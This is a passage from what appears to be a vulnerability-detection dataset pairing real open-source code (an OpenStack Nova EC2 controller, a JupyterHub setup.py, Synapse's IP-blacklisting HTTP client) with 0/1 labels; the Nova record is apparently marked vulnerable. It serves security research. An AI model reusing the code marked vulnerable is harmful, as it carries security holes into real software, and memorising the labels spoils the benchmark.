      'sourceDestCheck': _format_attr_source_dest_check,\n            'userData': _format_attr_user_data,\n            }\n\n        fn = attribute_formatter.get(attribute)\n        if fn is None:\n            raise exception.ApiError(\n                _('attribute not supported: %s') % attribute)\n\n        ec2_instance_id = instance_id\n        instance_id = ec2utils.ec2_id_to_id(ec2_instance_id)\n        instance = self.compute_api.get(context, instance_id)\n        result = {'instance_id': ec2_instance_id}\n        fn(instance, result)\n        return result\n\n    def describe_instances(self, context, **kwargs):\n        # Optional DescribeInstances argument\n        instance_id = kwargs.get('instance_id', None)\n        return self._format_describe_instances(context,\n                instance_id=instance_id)\n\n    def describe_instances_v6(self, context, **kwargs):\n        # Optional DescribeInstancesV6 argument\n        instance_id = kwargs.get('instance_id', None)\n        return self._format_describe_instances(context,\n                instance_id=instance_id, use_v6=True)\n\n    def _format_describe_instances(self, context, **kwargs):\n        return {'reservationSet': self._format_instances(context, **kwargs)}\n\n    def _format_run_instances(self, context, reservation_id):\n        i = self._format_instances(context, reservation_id=reservation_id)\n        assert len(i) == 1\n        return i[0]\n\n    def _format_instance_bdm(self, context, instance_id, root_device_name,\n                             result):\n        \"\"\"Format InstanceBlockDeviceMappingResponseItemType\"\"\"\n        root_device_type = 'instance-store'\n        mapping = []\n        for bdm in db.block_device_mapping_get_all_by_instance(context,\n                                                               instance_id):\n            volume_id = bdm['volume_id']\n            if (volume_id is None or bdm['no_device']):\n                continue\n\n            if (bdm['device_name'] == root_device_name and\n                (bdm['snapshot_id'] or bdm['volume_id'])):\n                assert not bdm['virtual_name']\n                root_device_type = 'ebs'\n\n            vol = self.volume_api.get(context, volume_id=volume_id)\n            LOG.debug(_(\"vol = %s\\n\"), vol)\n            # TODO(yamahata): volume attach time\n            ebs = {'volumeId': volume_id,\n                   'deleteOnTermination': bdm['delete_on_termination'],\n                   'attachTime': vol['attach_time'] or '-',\n                   'status': vol['status'], }\n            res = {'deviceName': bdm['device_name'],\n                   'ebs': ebs, }\n            mapping.append(res)\n\n        if mapping:\n            result['blockDeviceMapping'] = mapping\n        result['rootDeviceType'] = root_device_type\n\n    @staticmethod\n    def _format_instance_root_device_name(instance, result):\n        result['rootDeviceName'] = (instance.get('root_device_name') or\n                                    _DEFAULT_ROOT_DEVICE_NAME)\n\n    @staticmethod\n    def _format_instance_type(instance, result):\n        if instance['instance_type']:\n            result['instanceType'] = instance['instance_type'].get('name')\n        else:\n            result['instanceType'] = None\n\n    @staticmethod\n    def _format_group_set(instance, result):\n        security_group_names = []\n        if instance.get('security_groups'):\n            for security_group in instance['security_groups']:\n                security_group_names.append(security_group['name'])\n        result['groupSet'] = utils.convert_to_list_dict(\n            security_group_names, 'groupId')\n\n    def _format_instances(self, context, instance_id=None, use_v6=False,\n            **search_opts):\n        # TODO(termie): this method is poorly named as its name does not imply\n        #               that it will be making a variety of database calls\n        #               rather than simply formatting a bunch of instances that\n        #               were handed to it\n        reservations = {}\n        # NOTE(vish): instance_id is an optional list of ids to filter by\n        if instance_id:\n            instances = []\n            for ec2_id in instance_id:\n                internal_id = ec2utils.ec2_id_to_id(ec2_id)\n                try:\n                    instance = self.compute_api.get(context, internal_id)\n                except exception.NotFound:\n                    continue\n                instances.append(instance)\n        else:\n            try:\n                # always filter out deleted instances\n                search_opts['deleted'] = False\n                instances = self.compute_api.get_all(context,\n                                                     search_opts=search_opts)\n            except exception.NotFound:\n                instances = []\n        for instance in instances:\n            if not context.is_admin:\n                if instance['image_ref'] == str(FLAGS.vpn_image_id):\n                    continue\n            i = {}\n            instance_id = instance['id']\n            ec2_id = ec2utils.id_to_ec2_id(instance_id)\n            i['instanceId'] = ec2_id\n            i['imageId'] = self.image_ec2_id(instance['image_ref'])\n            self._format_kernel_id(instance, i, 'kernelId')\n            self._format_ramdisk_id(instance, i, 'ramdiskId')\n            i['instanceState'] = {\n                'code': instance['power_state'],\n                'name': state_description_from_vm_state(instance['vm_state'])}\n            fixed_addr = None\n            floating_addr = None\n            if instance['fixed_ips']:\n                fixed = instance['fixed_ips'][0]\n                fixed_addr = fixed['address']\n                if fixed['floating_ips']:\n                    floating_addr = fixed['floating_ips'][0]['address']\n                if fixed['network'] and use_v6:\n                    i['dnsNameV6'] = ipv6.to_global(\n                        fixed['network']['cidr_v6'],\n                        fixed['virtual_interface']['address'],\n                        instance['project_id'])\n\n            i['privateDnsName'] = fixed_addr\n            i['privateIpAddress'] = fixed_addr\n            i['publicDnsName'] = floating_addr\n            i['ipAddress'] = floating_addr or fixed_addr\n            i['dnsName'] = i['publicDnsName'] or i['privateDnsName']\n            i['keyName'] = instance['key_name']\n\n            if context.is_admin:\n                i['keyName'] = '%s (%s, %s)' % (i['keyName'],\n                    instance['project_id'],\n                    instance['host'])\n            i['productCodesSet'] = utils.convert_to_list_dict([],\n                                                              'product_codes')\n            self._format_instance_type(instance, i)\n            i['launchTime'] = instance['created_at']\n            i['amiLaunchIndex'] = instance['launch_index']\n            i['displayName'] = instance['display_name']\n            i['displayDescription'] = instance['display_description']\n            self._format_instance_root_device_name(instance, i)\n            self._format_instance_bdm(context, instance_id,\n                                      i['rootDeviceName'], i)\n            host = instance['host']\n            zone = self._get_availability_zone_by_host(context, host)\n            i['placement'] = {'availabilityZone': zone}\n            if instance['reservation_id'] not in reservations:\n                r = {}\n                r['reservationId'] = instance['reservation_id']\n                r['ownerId'] = instance['project_id']\n                self._format_group_set(instance, r)\n                r['instancesSet'] = []\n                reservations[instance['reservation_id']] = r\n            reservations[instance['reservation_id']]['instancesSet'].append(i)\n\n        return list(reservations.values())\n\n    def describe_addresses(self, context, **kwargs):\n        return self.format_addresses(context)\n\n    def format_addresses(self, context):\n        addresses = []\n        if context.is_admin:\n            iterator = db.floating_ip_get_all(context)\n        else:\n            iterator = db.floating_ip_get_all_by_project(context,\n                                                         context.project_id)\n        for floating_ip_ref in iterator:\n            if floating_ip_ref['project_id'] is None:\n                continue\n            address = floating_ip_ref['address']\n            ec2_id = None\n            if (floating_ip_ref['fixed_ip']\n                and floating_ip_ref['fixed_ip']['instance']):\n                instance_id = floating_ip_ref['fixed_ip']['instance']['id']\n                ec2_id = ec2utils.id_to_ec2_id(instance_id)\n            address_rv = {'public_ip': address,\n                          'instance_id': ec2_id}\n            if context.is_admin:\n                details = \"%s (%s)\" % (address_rv['instance_id'],\n                                       floating_ip_ref['project_id'])\n                address_rv['instance_id'] = details\n            addresses.append(address_rv)\n        return {'addressesSet': addresses}\n\n    def allocate_address(self, context, **kwargs):\n        LOG.audit(_(\"Allocate address\"), context=context)\n        try:\n            public_ip = self.network_api.allocate_floating_ip(context)\n            return {'publicIp': public_ip}\n        except rpc.RemoteError as ex:\n            # NOTE(tr3buchet) - why does this block exist?\n            if ex.exc_type == 'NoMoreFloatingIps':\n                raise exception.NoMoreFloatingIps()\n            else:\n                raise\n\n    def release_address(self, context, public_ip, **kwargs):\n        LOG.audit(_(\"Release address %s\"), public_ip, context=context)\n        self.network_api.release_floating_ip(context, address=public_ip)\n        return {'releaseResponse': [\"Address released.\"]}\n\n    def associate_address(self, context, instance_id, public_ip, **kwargs):\n        LOG.audit(_(\"Associate address %(public_ip)s to\"\n                \" instance %(instance_id)s\") % locals(), context=context)\n        instance_id = ec2utils.ec2_id_to_id(instance_id)\n        self.compute_api.associate_floating_ip(context,\n                                               instance_id=instance_id,\n                                               address=public_ip)\n        return {'associateResponse': [\"Address associated.\"]}\n\n    def disassociate_address(self, context, public_ip, **kwargs):\n        LOG.audit(_(\"Disassociate address %s\"), public_ip, context=context)\n        self.network_api.disassociate_floating_ip(context, address=public_ip)\n        return {'disassociateResponse': [\"Address disassociated.\"]}\n\n    def run_instances(self, context, **kwargs):\n        max_count = int(kwargs.get('max_count', 1))\n        if kwargs.get('kernel_id'):\n            kernel = self._get_image(context, kwargs['kernel_id'])\n            kwargs['kernel_id'] = kernel['id']\n        if kwargs.get('ramdisk_id'):\n            ramdisk = self._get_image(context, kwargs['ramdisk_id'])\n            kwargs['ramdisk_id'] = ramdisk['id']\n        for bdm in kwargs.get('block_device_mapping', []):\n            _parse_block_device_mapping(bdm)\n\n        image = self._get_image(context, kwargs['image_id'])\n\n        if image:\n            image_state = self._get_image_state(image)\n        else:\n            raise exception.ImageNotFound(image_id=kwargs['image_id'])\n\n        if image_state != 'available':\n            raise exception.ApiError(_('Image must be available'))\n\n        instances = self.compute_api.create(context,\n            instance_type=instance_types.get_instance_type_by_name(\n                kwargs.get('instance_type', None)),\n            image_href=self._get_image(context, kwargs['image_id'])['id'],\n            min_count=int(kwargs.get('min_count', max_count)),\n            max_count=max_count,\n            kernel_id=kwargs.get('kernel_id'),\n            ramdisk_id=kwargs.get('ramdisk_id'),\n            display_name=kwargs.get('display_name'),\n            display_description=kwargs.get('display_description'),\n            key_name=kwargs.get('key_name'),\n            user_data=kwargs.get('user_data'),\n            security_group=kwargs.get('security_group'),\n            availability_zone=kwargs.get('placement', {}).get(\n                                  'availability_zone'),\n            block_device_mapping=kwargs.get('block_device_mapping', {}))\n        return self._format_run_instances(context,\n                reservation_id=instances[0]['reservation_id'])\n\n    def _do_instance(self, action, context, ec2_id):\n        instance_id = ec2utils.ec2_id_to_id(ec2_id)\n        action(context, instance_id=instance_id)\n\n    def _do_instances(self, action, context, instance_id):\n        for ec2_id in instance_id:\n            self._do_instance(action, context, ec2_id)\n\n    def terminate_instances(self, context, instance_id, **kwargs):\n        \"\"\"Terminate each instance in instance_id, which is a list of ec2 ids.\n        instance_id is a kwarg so its name cannot be modified.\"\"\"\n        LOG.debug(_(\"Going to start terminating instances\"))\n        self._do_instances(self.compute_api.delete, context, instance_id)\n        return True\n\n    def reboot_instances(self, context, instance_id, **kwargs):\n        \"\"\"instance_id is a list of instance ids\"\"\"\n        LOG.audit(_(\"Reboot instance %r\"), instance_id, context=context)\n        self._do_instances(self.compute_api.reboot, context, instance_id)\n        return True\n\n    def stop_instances(self, context, instance_id, **kwargs):\n        \"\"\"Stop each instances in instance_id.\n        Here instance_id is a list of instance ids\"\"\"\n        LOG.debug(_(\"Going to stop instances\"))\n        self._do_instances(self.compute_api.stop, context, instance_id)\n        return True\n\n    def start_instances(self, context, instance_id, **kwargs):\n        \"\"\"Start each instances in instance_id.\n        Here instance_id is a list of instance ids\"\"\"\n        LOG.debug(_(\"Going to start instances\"))\n        self._do_instances(self.compute_api.start, context, instance_id)\n        return True\n\n    def rescue_instance(self, context, instance_id, **kwargs):\n        \"\"\"This is an extension to the normal ec2_api\"\"\"\n        self._do_instance(self.compute_api.rescue, context, instance_id)\n        return True\n\n    def unrescue_instance(self, context, instance_id, **kwargs):\n        \"\"\"This is an extension to the normal ec2_api\"\"\"\n        self._do_instance(self.compute_api.unrescue, context, instance_id)\n        return True\n\n    def update_instance(self, context, instance_id, **kwargs):\n        updatable_fields = ['display_name', 'display_description']\n        changes = {}\n        for field in updatable_fields:\n            if field in kwargs:\n                changes[field] = kwargs[field]\n        if changes:\n            instance_id = ec2utils.ec2_id_to_id(instance_id)\n            self.compute_api.update(context, instance_id=instance_id,\n                                    **changes)\n        return True\n\n    @staticmethod\n    def _image_type(image_type):\n        \"\"\"Converts to a three letter image type.\n\n        aki, kernel => aki\n        ari, ramdisk => ari\n        anything else => ami\n\n        \"\"\"\n        if image_type == 'kernel':\n            return 'aki'\n        if image_type == 'ramdisk':\n            return 'ari'\n        if image_type not in ['aki', 'ari']:\n            return 'ami'\n        return image_type\n\n    @staticmethod\n    def image_ec2_id(image_id, image_type='ami'):\n        \"\"\"Returns image ec2_id using id and three letter type.\"\"\"\n        template = image_type + '-%08x'\n        try:\n            return ec2utils.id_to_ec2_id(int(image_id), template=template)\n        except ValueError:\n            #TODO(wwolf): once we have ec2_id -> glance_id mapping\n            # in place, this wont be necessary\n            return \"ami-00000000\"\n\n    def _get_image(self, context, ec2_id):\n        try:\n            internal_id = ec2utils.ec2_id_to_id(ec2_id)\n            image = self.image_service.show(context, internal_id)\n        except (exception.InvalidEc2Id, exception.ImageNotFound):\n            try:\n                return self.image_service.show_by_name(context, ec2_id)\n            except exception.NotFound:\n                raise exception.ImageNotFound(image_id=ec2_id)\n        image_type = ec2_id.split('-')[0]\n        if self._image_type(image.get('container_format')) != image_type:\n            raise exception.ImageNotFound(image_id=ec2_id)\n        return image\n\n    def _format_image(self, image):\n        \"\"\"Convert from format defined by BaseImageService to S3 format.\"\"\"\n        i = {}\n        image_type = self._image_type(image.get('container_format'))\n        ec2_id = self.image_ec2_id(image.get('id'), image_type)\n        name = image.get('name')\n        i['imageId'] = ec2_id\n        kernel_id = image['properties'].get('kernel_id')\n        if kernel_id:\n            i['kernelId'] = self.image_ec2_id(kernel_id, 'aki')\n        ramdisk_id = image['properties'].get('ramdisk_id')\n        if ramdisk_id:\n            i['ramdiskId'] = self.image_ec2_id(ramdisk_id, 'ari')\n        i['imageOwnerId'] = image['properties'].get('owner_id')\n        if name:\n            i['imageLocation'] = \"%s (%s)\" % (image['properties'].\n                                              get('image_location'), name)\n        else:\n            i['imageLocation'] = image['properties'].get('image_location')\n\n        i['imageState'] = self._get_image_state(image)\n        i['displayName'] = name\n        i['description'] = image.get('description')\n        display_mapping = {'aki': 'kernel',\n                           'ari': 'ramdisk',\n                           'ami': 'machine'}\n        i['imageType'] = display_mapping.get(image_type)\n        i['isPublic'] = image.get('is_public') == True\n        i['architecture'] = image['properties'].get('architecture')\n\n        properties = image['properties']\n        root_device_name = block_device.properties_root_device_name(properties)\n        root_device_type = 'instance-store'\n        for bdm in properties.get('block_device_mapping', []):\n            if (bdm.get('device_name') == root_device_name and\n                ('snapshot_id' in bdm or 'volume_id' in bdm) and\n                not bdm.get('no_device')):\n                root_device_type = 'ebs'\n        i['rootDeviceName'] = (root_device_name or _DEFAULT_ROOT_DEVICE_NAME)\n        i['rootDeviceType'] = root_device_type\n\n        _format_mappings(properties, i)\n\n        return i\n\n    def describe_images(self, context, image_id=None, **kwargs):\n        # NOTE: image_id is a list!\n        if image_id:\n            images = []\n            for ec2_id in image_id:\n                try:\n                    image = self._get_image(context, ec2_id)\n                except exception.NotFound:\n                    raise exception.ImageNotFound(image_id=ec2_id)\n                images.append(image)\n        else:\n            images = self.image_service.detail(context)\n        images = [self._format_image(i) for i in images]\n        return {'imagesSet': images}\n\n    def deregister_image(self, context, image_id, **kwargs):\n        LOG.audit(_(\"De-registering image %s\"), image_id, context=context)\n        image = self._get_image(context, image_id)\n        internal_id = image['id']\n        self.image_service.delete(context, internal_id)\n        return {'imageId': image_id}\n\n    def _register_image(self, context, metadata):\n        image = self.image_service.create(context, metadata)\n        image_type = self._image_type(image.get('container_format'))\n        image_id = self.image_ec2_id(image['id'], image_type)\n        return image_id\n\n    def register_image(self, context, image_location=None, **kwargs):\n        if image_location is None and 'name' in kwargs:\n            image_location = kwargs['name']\n        metadata = {'properties': {'image_location': image_location}}\n\n        if 'root_device_name' in kwargs:\n            metadata['properties']['root_device_name'] = \\\n            kwargs.get('root_device_name')\n\n        mappings = [_parse_block_device_mapping(bdm) for bdm in\n                    kwargs.get('block_device_mapping', [])]\n        if mappings:\n            metadata['properties']['block_device_mapping'] = mappings\n\n        image_id = self._register_image(context, metadata)\n        msg = _(\"Registered image %(image_location)s with\"\n                \" id %(image_id)s\") % locals()\n        LOG.audit(msg, context=context)\n        return {'imageId': image_id}\n\n    def describe_image_attribute(self, context, image_id, attribute, **kwargs):\n        def _block_device_mapping_attribute(image, result):\n            _format_mappings(image['properties'], result)\n\n        def _launch_permission_attribute(image, result):\n            result['launchPermission'] = []\n            if image['is_public']:\n                result['launchPermission'].append({'group': 'all'})\n\n        def _root_device_name_attribute(image, result):\n            result['rootDeviceName'] = \\\n                block_device.properties_root_device_name(image['properties'])\n            if result['rootDeviceName'] is None:\n                result['rootDeviceName'] = _DEFAULT_ROOT_DEVICE_NAME\n\n        supported_attributes = {\n            'blockDeviceMapping': _block_device_mapping_attribute,\n            'launchPermission': _launch_permission_attribute,\n            'rootDeviceName': _root_device_name_attribute,\n            }\n\n        fn = supported_attributes.get(attribute)\n        if fn is None:\n            raise exception.ApiError(_('attribute not supported: %s')\n                                     % attribute)\n        try:\n            image = self._get_image(context, image_id)\n        except exception.NotFound:\n            raise exception.ImageNotFound(image_id=image_id)\n\n        result = {'imageId': image_id}\n        fn(image, result)\n        return result\n\n    def modify_image_attribute(self, context, image_id, attribute,\n                               operation_type, **kwargs):\n        # TODO(devcamcar): Support users and groups other than 'all'.\n        if attribute != 'launchPermission':\n            raise exception.ApiError(_('attribute not supported: %s')\n                                     % attribute)\n        if not 'user_group' in kwargs:\n            raise exception.ApiError(_('user or group not specified'))\n        if len(kwargs['user_group']) != 1 and kwargs['user_group'][0] != 'all':\n            raise exception.ApiError(_('only group \"all\" is supported'))\n        if not operation_type in ['add', 'remove']:\n            raise exception.ApiError(_('operation_type must be add or remove'))\n        LOG.audit(_(\"Updating image %s publicity\"), image_id, context=context)\n\n        try:\n            image = self._get_image(context, image_id)\n        except exception.NotFound:\n            raise exception.ImageNotFound(image_id=image_id)\n        internal_id = image['id']\n        del(image['id'])\n\n        image['is_public'] = (operation_type == 'add')\n        return self.image_service.update(context, internal_id, image)\n\n    def update_image(self, context, image_id, **kwargs):\n        internal_id = ec2utils.ec2_id_to_id(image_id)\n        result = self.image_service.update(context, internal_id, dict(kwargs))\n        return result\n\n    # TODO(yamahata): race condition\n    # At the moment there is no way to prevent others from\n    # manipulating instances/volumes/snapshots.\n    # As other code doesn't take it into consideration, here we don't\n    # care of it for now. Ostrich algorithm\n    def create_image(self, context, instance_id, **kwargs):\n        # NOTE(yamahata): name/description are ignored by register_image(),\n        #                 do so here\n        no_reboot = kwargs.get('no_reboot', False)\n\n        ec2_instance_id = instance_id\n        instance_id = ec2utils.ec2_id_to_id(ec2_instance_id)\n        instance = self.compute_api.get(context, instance_id)\n\n        # stop the instance if necessary\n        restart_instance = False\n        if not no_reboot:\n            vm_state = instance['vm_state']\n\n            # if the instance is in subtle state, refuse to proceed.\n            if vm_state not in (vm_states.ACTIVE, vm_states.STOPPED):\n                raise exception.InstanceNotRunning(instance_id=ec2_instance_id)\n\n            if vm_state == vm_states.ACTIVE:\n                restart_instance = True\n                self.compute_api.stop(context, instance_id=instance_id)\n\n            # wait instance for really stopped\n            start_time = time.time()\n            while vm_state != vm_states.STOPPED:\n                time.sleep(1)\n                instance = self.compute_api.get(context, instance_id)\n                vm_state = instance['vm_state']\n                # NOTE(yamahata): timeout and error. 1 hour for now for safety.\n                #                 Is it too short/long?\n                #                 Or is there any better way?\n                timeout = 1 * 60 * 60 * 60\n                if time.time() > start_time + timeout:\n                    raise exception.ApiError(\n                        _('Couldn\\'t stop instance with in %d sec') % timeout)\n\n        src_image = self._get_image(context, instance['image_ref'])\n        properties = src_image['properties']\n        if instance['root_device_name']:\n            properties['root_device_name'] = instance['root_device_name']\n\n        mapping = []\n        bdms = db.block_device_mapping_get_all_by_instance(context,\n                                                           instance_id)\n        for bdm in bdms:\n            if bdm.no_device:\n                continue\n            m = {}\n            for attr in ('device_name', 'snapshot_id', 'volume_id',\n                         'volume_size', 'delete_on_termination', 'no_device',\n                         'virtual_name'):\n                val = getattr(bdm, attr)\n                if val is not None:\n                    m[attr] = val\n\n            volume_id = m.get('volume_id')\n            if m.get('snapshot_id') and volume_id:\n                # create snapshot based on volume_id\n                vol = self.volume_api.get(context, volume_id=volume_id)\n                # NOTE(yamahata): Should we wait for snapshot creation?\n                #                 Linux LVM snapshot creation completes in\n                #                 short time, it doesn't matter for now.\n                snapshot = self.volume_api.create_snapshot_force(\n                    context, volume_id=volume_id, name=vol['display_name'],\n                    description=vol['display_description'])\n                m['snapshot_id'] = snapshot['id']\n                del m['volume_id']\n\n            if m:\n                mapping.append(m)\n\n        for m in _properties_get_mappings(properties):\n            virtual_name = m['virtual']\n            if virtual_name in ('ami', 'root'):\n                continue\n\n            assert block_device.is_swap_or_ephemeral(virtual_name)\n            device_name = m['device']\n            if device_name in [b['device_name'] for b in mapping\n                               if not b.get('no_device', False)]:\n                continue\n\n            # NOTE(yamahata): swap and ephemeral devices are specified in\n            #                 AMI, but disabled for this instance by user.\n            #                 So disable those device by no_device.\n            mapping.append({'device_name': device_name, 'no_device': True})\n\n        if mapping:\n            properties['block_device_mapping'] = mapping\n\n        for attr in ('status', 'location', 'id'):\n            src_image.pop(attr, None)\n\n        image_id = self._register_image(context, src_image)\n\n        if restart_instance:\n            self.compute_api.start(context, instance_id=instance_id)\n\n        return {'imageId': image_id}\n", "target": 1}
{"idx": 1061, "func": "from setuptools import setup\n\nsetup(\n    name='jupyterhub-systemdspawner',\n    version='0.15.0',\n    description='JupyterHub Spawner using systemd for resource isolation',\n    long_description='See https://github.com/jupyterhub/systemdspawner for more info',\n    url='https://github.com/jupyterhub/systemdspawner',\n    author='Yuvi Panda',\n    author_email='yuvipanda@gmail.com',\n    license='3 Clause BSD',\n    packages=['systemdspawner'],\n    entry_points={\n        'jupyterhub.spawners': [\n            'systemdspawner = systemdspawner:SystemdSpawner',\n        ],\n    },\n    install_requires=[\n        'jupyterhub>=0.9',\n        'tornado>=5.0'\n    ],\n)\n", "target": 0}
{"idx": 1062, "func": "# -*- coding: utf-8 -*-\n# Copyright 2014-2016 OpenMarket Ltd\n# Copyright 2018 New Vector Ltd\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nimport logging\nimport urllib.parse\nfrom io import BytesIO\nfrom typing import (\n    TYPE_CHECKING,\n    Any,\n    BinaryIO,\n    Dict,\n    Iterable,\n    List,\n    Mapping,\n    Optional,\n    Sequence,\n    Tuple,\n    Union,\n)\n\nimport treq\nfrom canonicaljson import encode_canonical_json\nfrom netaddr import IPAddress, IPSet\nfrom prometheus_client import Counter\nfrom zope.interface import implementer, provider\n\nfrom OpenSSL import SSL\nfrom OpenSSL.SSL import VERIFY_NONE\nfrom twisted.internet import defer, error as twisted_error, protocol, ssl\nfrom twisted.internet.interfaces import (\n    IAddress,\n    IHostResolution,\n    IReactorPluggableNameResolver,\n    IResolutionReceiver,\n)\nfrom twisted.internet.task import Cooperator\nfrom twisted.python.failure import Failure\nfrom twisted.web._newclient import ResponseDone\nfrom twisted.web.client import (\n    Agent,\n    HTTPConnectionPool,\n    ResponseNeverReceived,\n    readBody,\n)\nfrom twisted.web.http import PotentialDataLoss\nfrom twisted.web.http_headers import Headers\nfrom twisted.web.iweb import IAgent, IBodyProducer, IResponse\n\nfrom synapse.api.errors import Codes, HttpResponseException, SynapseError\nfrom synapse.http import QuieterFileBodyProducer, RequestTimedOutError, redact_uri\nfrom synapse.http.proxyagent import ProxyAgent\nfrom synapse.logging.context import make_deferred_yieldable\nfrom synapse.logging.opentracing import set_tag, start_active_span, tags\nfrom synapse.util import json_decoder\nfrom synapse.util.async_helpers import timeout_deferred\n\nif TYPE_CHECKING:\n    from synapse.app.homeserver import HomeServer\n\nlogger = logging.getLogger(__name__)\n\noutgoing_requests_counter = Counter(\"synapse_http_client_requests\", \"\", [\"method\"])\nincoming_responses_counter = Counter(\n    \"synapse_http_client_responses\", \"\", [\"method\", \"code\"]\n)\n\n# the type of the headers list, to be passed to the t.w.h.Headers.\n# Actually we can mix str and bytes keys, but Mapping treats 'key' as invariant so\n# we simplify.\nRawHeaders = Union[Mapping[str, \"RawHeaderValue\"], Mapping[bytes, \"RawHeaderValue\"]]\n\n# the value actually has to be a List, but List is invariant so we can't specify that\n# the entries can either be Lists or bytes.\nRawHeaderValue = Sequence[Union[str, bytes]]\n\n# the type of the query params, to be passed into `urlencode`\nQueryParamValue = Union[str, bytes, Iterable[Union[str, bytes]]]\nQueryParams = Union[Mapping[str, QueryParamValue], Mapping[bytes, QueryParamValue]]\n\n\ndef check_against_blacklist(\n    ip_address: IPAddress, ip_whitelist: Optional[IPSet], ip_blacklist: IPSet\n) -> bool:\n    \"\"\"\n    Compares an IP address to allowed and disallowed IP sets.\n\n    Args:\n        ip_address: The IP address to check\n        ip_whitelist: Allowed IP addresses.\n        ip_blacklist: Disallowed IP addresses.\n\n    Returns:\n        True if the IP address is in the blacklist and not in the whitelist.\n    \"\"\"\n    if ip_address in ip_blacklist:\n        if ip_whitelist is None or ip_address not in ip_whitelist:\n            return True\n    return False\n\n\n_EPSILON = 0.00000001\n\n\ndef _make_scheduler(reactor):\n    \"\"\"Makes a schedular suitable for a Cooperator using the given reactor.\n\n    (This is effectively just a copy from `twisted.internet.task`)\n    \"\"\"\n\n    def _scheduler(x):\n        return reactor.callLater(_EPSILON, x)\n\n    return _scheduler\n\n\nclass _IPBlacklistingResolver:\n    \"\"\"\n    A proxy for reactor.nameResolver which only produces non-blacklisted IP\n    addresses, preventing DNS rebinding attacks on URL preview.\n    \"\"\"\n\n    def __init__(\n        self,\n        reactor: IReactorPluggableNameResolver,\n        ip_whitelist: Optional[IPSet],\n        ip_blacklist: IPSet,\n    ):\n        \"\"\"\n        Args:\n            reactor: The twisted reactor.\n            ip_whitelist: IP addresses to allow.\n            ip_blacklist: IP addresses to disallow.\n        \"\"\"\n        self._reactor = reactor\n        self._ip_whitelist = ip_whitelist\n        self._ip_blacklist = ip_blacklist\n\n    def resolveHostName(\n        self, recv: IResolutionReceiver, hostname: str, portNumber: int = 0\n    ) -> IResolutionReceiver:\n\n        r = recv()\n        addresses = []  # type: List[IAddress]\n\n        def _callback() -> None:\n            r.resolutionBegan(None)\n\n            has_bad_ip = False\n            for i in addresses:\n                ip_address = IPAddress(i.host)\n\n                if check_against_blacklist(\n                    ip_address, self._ip_whitelist, self._ip_blacklist\n                ):\n                    logger.info(\n                        \"Dropped %s from DNS resolution to %s due to blacklist\"\n                        % (ip_address, hostname)\n                    )\n                    has_bad_ip = True\n\n            # if we have a blacklisted IP, we'd like to raise an error to block the\n            # request, but all we can really do from here is claim that there were no\n            # valid results.\n            if not has_bad_ip:\n                for i in addresses:\n                    r.addressResolved(i)\n            r.resolutionComplete()\n\n        @provider(IResolutionReceiver)\n        class EndpointReceiver:\n            @staticmethod\n            def resolutionBegan(resolutionInProgress: IHostResolution) -> None:\n                pass\n\n            @staticmethod\n            def addressResolved(address: IAddress) -> None:\n                addresses.append(address)\n\n            @staticmethod\n            def resolutionComplete() -> None:\n                _callback()\n\n        self._reactor.nameResolver.resolveHostName(\n            EndpointReceiver, hostname, portNumber=portNumber\n        )\n\n        return r\n\n\n@implementer(IReactorPluggableNameResolver)\nclass BlacklistingReactorWrapper:\n    \"\"\"\n    A Reactor wrapper which will prevent DNS resolution to blacklisted IP\n    addresses, to prevent DNS rebinding.\n    \"\"\"\n\n    def __init__(\n        self,\n        reactor: IReactorPluggableNameResolver,\n        ip_whitelist: Optional[IPSet],\n        ip_blacklist: IPSet,\n    ):\n        self._reactor = reactor\n\n        # We need to use a DNS resolver which filters out blacklisted IP\n        # addresses, to prevent DNS rebinding.\n        self._nameResolver = _IPBlacklistingResolver(\n            self._reactor, ip_whitelist, ip_blacklist\n        )\n\n    def __getattr__(self, attr: str) -> Any:\n        # Passthrough to the real reactor except for the DNS resolver.\n        if attr == \"nameResolver\":\n            return self._nameResolver\n        else:\n            return getattr(self._reactor, attr)\n\n\nclass BlacklistingAgentWrapper(Agent):\n    \"\"\"\n    An Agent wrapper which will prevent access to IP addresses being accessed\n    directly (without an IP address lookup).\n    \"\"\"\n\n    def __init__(\n        self,\n        agent: IAgent,\n        ip_whitelist: Optional[IPSet] = None,\n        ip_blacklist: Optional[IPSet] = None,\n    ):\n        \"\"\"\n        Args:\n            agent: The Agent to wrap.\n            ip_whitelist: IP addresses to allow.\n            ip_blacklist: IP addresses to disallow.\n        \"\"\"\n        self._agent = agent\n        self._ip_whitelist = ip_whitelist\n        self._ip_blacklist = ip_blacklist\n\n    def request(\n        self,\n        method: bytes,\n        uri: bytes,\n        headers: Optional[Headers] = None,\n        bodyProducer: Optional[IBodyProducer] = None,\n    ) -> defer.Deferred:\n        h = urllib.parse.urlparse(uri.decode(\"ascii\"))\n\n        try:\n            ip_address = IPAddress(h.hostname)\n\n            if check_against_blacklist(\n                ip_address, self._ip_whitelist, self._ip_blacklist\n            ):\n                logger.info(\"Blocking access to %s due to blacklist\" % (ip_address,))\n                e = SynapseError(403, \"IP address blocked by IP blacklist entry\")\n                return defer.fail(Failure(e))\n        except Exception:\n            # Not an IP\n            pass\n\n        return self._agent.request(\n            method, uri, headers=headers, bodyProducer=bodyProducer\n        )\n\n\nclass SimpleHttpClient:\n    \"\"\"\n    A simple, no-frills HTTP client with methods that wrap up common ways of\n    using HTTP in Matrix\n    \"\"\"\n\n    def __init__(\n        self,\n        hs: \"HomeServer\",\n        treq_args: Dict[str, Any] = {},\n        ip_whitelist: Optional[IPSet] = None,\n        ip_blacklist: Optional[IPSet] = None,\n        http_proxy: Optional[bytes] = None,\n        https_proxy: Optional[bytes] = None,\n    ):\n        \"\"\"\n        Args:\n            hs\n            treq_args: Extra keyword arguments to be given to treq.request.\n            ip_blacklist: The IP addresses that are blacklisted that\n                we may not request.\n            ip_whitelist: The whitelisted IP addresses, that we can\n               request if it were otherwise caught in a blacklist.\n            http_proxy: proxy server to use for http connections. host[:port]\n            https_proxy: proxy server to use for https connections. host[:port]\n        \"\"\"\n        self.hs = hs\n\n        self._ip_whitelist = ip_whitelist\n        self._ip_blacklist = ip_blacklist\n        self._extra_treq_args = treq_args\n\n        self.user_agent = hs.version_string\n        self.clock = hs.get_clock()\n        if 